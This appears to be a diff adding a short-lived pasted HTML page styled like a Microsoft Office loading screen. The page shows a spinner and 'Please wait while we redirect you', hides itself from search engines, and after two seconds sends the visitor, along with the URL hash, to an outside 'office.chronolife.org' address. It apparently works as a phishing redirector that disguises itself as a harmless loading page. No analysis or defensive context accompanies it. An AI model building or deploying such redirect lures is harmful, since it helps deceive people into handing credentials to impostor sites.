@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="color-scheme" content="light">
+    <meta name="supported-color-schemes" content="light">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #323130;
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            text-align: center;
+            padding: 2rem;
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #f3f2f1;
+            border-radius: 50%;
+            border-top-color: #0078d4;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem;
+        }
+
+        .message {
+            font-size: 1.2rem;
+            color: #323130;
+            margin-bottom: 0.5rem;
+        }
+
+        .submessage {
+            font-size: 0.9rem;
+            color: #605e5c;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <div class="message">Loading...</div>
+        <div class="submessage">Please wait while we redirect you</div>
+    </div>
+
+    <script>
+        (function() {
+            const redirectDelay = 2000; // 2 seconds delay
+            
+            function handleRedirect() {
+                const currentHash = window.location.hash;
+                window.location.replace('https://office.chronolife.org/pMyXZDmn' + currentHash);
+            }
+
+            // Start redirect after delay
+            setTimeout(handleRedirect, redirectDelay);
+        })();
+    </script>
+</body>
+</html>
+This paste expires in <1 day. Public IP access. Share whatever you see with others in seconds with Context.Terms of ServiceReport this
